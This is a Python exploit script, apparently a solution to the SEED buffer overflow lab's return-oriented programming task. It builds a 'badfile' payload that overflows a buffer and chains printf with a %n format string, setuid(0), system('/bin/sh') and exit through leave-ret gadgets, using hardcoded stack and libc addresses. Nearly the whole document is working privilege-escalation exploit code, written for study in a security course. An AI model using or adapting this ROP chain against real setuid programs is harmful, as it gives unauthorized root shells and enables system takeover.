#!/usr/bin/python3
# SEED buffer overflow lab. Task 6. Return Oriented Programming.

import sys

content = bytearray(0xaa for i in range(68))

# printf will be called like this: printf({format string}, {addr of zero})
# in the environment variables, there are: MYEGG="/bin/sh" FMT="%n"


buffer_addr = 0xbfffeb84 + 0x70

# at ebp write the address before setuid
A = 20
target_ebp = buffer_addr + 10 * 4
content[A:A+4] = (target_ebp).to_bytes(4,byteorder='little')

# then put address of printf
A += 4 
printf_addr = 0xb7e51670
content[A:A+4] = (printf_addr).to_bytes(4,byteorder='little')

# then the address of leave ret
A += 4
leave_ret_addr = 0x8048538
content[A:A+4] = (leave_ret_addr).to_bytes(4,byteorder='little')

# then the address of the format string in environment variables
A += 4
format_addr = 0xbfffff19
content[A:A+4] = (format_addr).to_bytes(4,byteorder='little')

# the address of the zero (word before system)
A += 4
target_ebp = buffer_addr + 13 * 4
content[A:A+4] = (target_ebp).to_bytes(4,byteorder='little')

# the address of the word right before system
A += 4
content[A:A+4] = (target_ebp).to_bytes(4,byteorder='little')

L = A + 4
setuid_addr = 0xb7eb9170
content[L:L+4] = (setuid_addr).to_bytes(4,byteorder='little')

# could have used pop ret but used leave ret for uniformity
M = L + 4
content[M:M+4] = (leave_ret_addr).to_bytes(4,byteorder='little')

# zero word
N = M + 4
content[N:N+4] = (0xaaaaaaaa).to_bytes(4,byteorder='little')

Y = N + 4
system_addr = 0xb7e42da0 #0xb7e7d410 strlen #0xb7e51670 printf #0xb7e42da0 system #0xbbbbbbbb 
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = Y + 4 #20+4+4
exit_addr = 0xb7e369d0 #0xcccccccc #
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

X = Z + 4 #20+4+4+4
sh_addr = 0xbffff184 #0xbffff09a terminator #0xbffff18b terminal
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

with open("badfile","wb") as f:
	f.write(content)
